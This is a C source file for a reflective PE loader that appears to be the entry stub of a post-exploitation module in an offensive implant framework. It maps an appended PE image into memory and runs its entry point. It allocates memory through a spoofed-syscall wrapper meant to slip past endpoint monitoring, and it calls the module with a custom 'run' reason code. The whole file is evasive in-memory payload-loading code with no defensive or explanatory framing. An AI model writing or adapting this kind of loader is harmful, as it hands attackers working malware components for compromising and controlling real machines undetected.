#include    "Instance.h"
#include    "Common.h"
#include    "Macros.h"
#include    "Ntdll.h"
#include	"PreHash.h"

#include    "PostexReflective.h"

D_SEC(B)
BOOL Main(
    _In_ PVOID      Param,
    _In_ PINSTANCE  Inst
    )
{
    NTSTATUS 		status = 0;
    HANDLE 			hThread = NULL;
    DLLMAIN 		entryPoint = 0;
	RDATA_SECTION   rData = { 0 };
	
    UINT_PTR uiMemPeAddr = C_DW64(Inst->Info.End);
    PIMAGE_DOS_HEADER pDosHeader = uiMemPeAddr;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(uiMemPeAddr + pDosHeader->e_lfanew);

    SIZE_T dwImgSize = pNtHeader->OptionalHeader.SizeOfImage;
    PVOID pMemPeAddr = NULL;

	status = SPOOF_SYSCALL(NtAllocateVirtualMemory,
		NtCurrentProcess, &pMemPeAddr, 0, &dwImgSize, MEM_COMMIT, PAGE_READWRITE);

	if (NT_ERROR(status))
    {
		return FALSE;
	}


    CopySections(pMemPeAddr, pNtHeader, uiMemPeAddr);

    if (!ProcessImportTable(pMemPeAddr, pNtHeader, Inst))
    {

		return FALSE;
	}
    ApplyBaseRelocations(pMemPeAddr, pNtHeader);


   	if (!PatchMemoryProtection(pMemPeAddr, pNtHeader, Inst))
    {
		return FALSE;
	}   

    entryPoint = (DLLMAIN)(
		C_DW64(pMemPeAddr) + pNtHeader->OptionalHeader.AddressOfEntryPoint);

    entryPoint((HINSTANCE)&Main, DLL_PROCESS_ATTACH, &rData);    			// Init Module
    entryPoint((HINSTANCE)&Main, 0x4, NULL);    							// Run Module

    return TRUE;
}